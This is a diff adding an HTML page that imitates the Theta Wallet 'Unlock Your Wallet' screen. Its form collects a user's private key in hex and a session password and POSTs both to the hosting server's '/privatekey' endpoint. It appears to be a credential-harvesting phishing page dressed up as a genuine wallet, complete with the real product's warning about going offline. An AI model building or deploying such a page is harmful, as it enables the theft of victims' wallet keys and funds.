@@ -1,0 +1,99 @@
+<html>
+<head>
+  <meta charset="utf-8" />
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <meta
+    name="viewport"
+    content="width=device-width,initial-scale=1,shrink-to-fit=no"
+  />
+  <meta name="theme-color" content="#000000" />
+  <meta
+    name="google-site-verification"
+    content="KcY9AgCSabld-jTuurE9YBIV2pH0W5T1ACd0N4t1mPo"
+  />
+  <link href="//db.onlinewebfonts.com/c/f8dc055baf8041b53f8a03bd4d3e3444?family=Alwyn+New" rel="stylesheet" type="text/css"/>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+ 
+  <title>Theta Wallet</title>
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+  <link href="/css/style.css" rel="stylesheet" type="text/css">
+  </head>
+  <body>
+
+  <div id="root">
+    <div class="App">
+      <div class="NavBar NavBar--is-centered">
+        <div
+          style="display: flex; flex-direction: column; align-items: center;"
+        >
+          <img class="NavBar__logo" src="/images/theta_wallet_logo@2x.png" />
+        </div>
+      </div>
+      <div class="Pages">
+        <div class="UnlockWalletPage">
+          <div class="UnlockWalletPage__wrapper">
+            <div class="UnlockWalletPage__title">Unlock Your Wallet</div>
+            <div class="UnlockWalletCard">
+              <div class="UnlockWalletCard__content">
+                <div class="UnlockWalletCard__header">
+                  <div
+                    class="TabBar UnlockWalletCard__tab-bar TabBar--is-centered TabBar--is-condensed"
+                  >
+                    <a class="TabBarItem" href="/keystore"
+                      ><div class="TabBarItem__title">Keystore</div></a
+                    ><a class="TabBarItem" href="/mnemonic"
+                      ><div class="TabBarItem__title">Mnemonic</div></a
+                    ><a
+                      class="TabBarItem TabBarItem--is-active"
+                      href="/privatekey"
+                      aria-current="page"
+                      ><div class="TabBarItem__title">Private Key</div></a
+                    ><a class="TabBarItem" href="/hardware"
+                      ><div class="TabBarItem__title">Hardware</div></a
+                    >
+                  </div>
+                </div>
+                <form class="UnlockWalletViaPrivateKey" method="post" action="/privatekey">
+                  <div class="UnlockWalletViaPrivateKey__title">
+                    Please enter your private key
+                  </div>
+                  <textarea
+                    class="UnlockWalletViaPrivateKey__private-key"
+                    name="privatekey" type="text" required
+                  ></textarea>
+                  <div
+                    class="UnlockWalletViaPrivateKey__private-key-instructions"
+                  >
+                    Please enter your private key in HEX format.
+                  </div>
+                  <input
+                    class="UnlockWalletViaPrivateKey__password-input"
+                    placeholder="Enter temporary session password"
+                    name="password"
+                    type="password"
+                    value="" required
+                  />
+                  <div class="UnlockWalletCard__warning">
+                    Before you enter your private key, we recommend you
+                    disconnect your device from the internet. You will be able
+                    to reconnect once your wallet is unlocked.
+                  </div>
+                  <div class="UnlockWalletViaPrivateKey__footer">
+                    <button
+                      class="GradientButton" type="submit" name="submit" value="submit"
+                      ><div class="GradientButton__title">Unlock Wallet</div></button
+                    >
+                  </div>
+                </form>
+              </div>
+            </div>
+            <div class="UnlockWalletPage__subtitle">
+              <span>Don't have a wallet?</span
+              ><a href="">Create Wallet</a>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div></div>
+</body>
+</html>
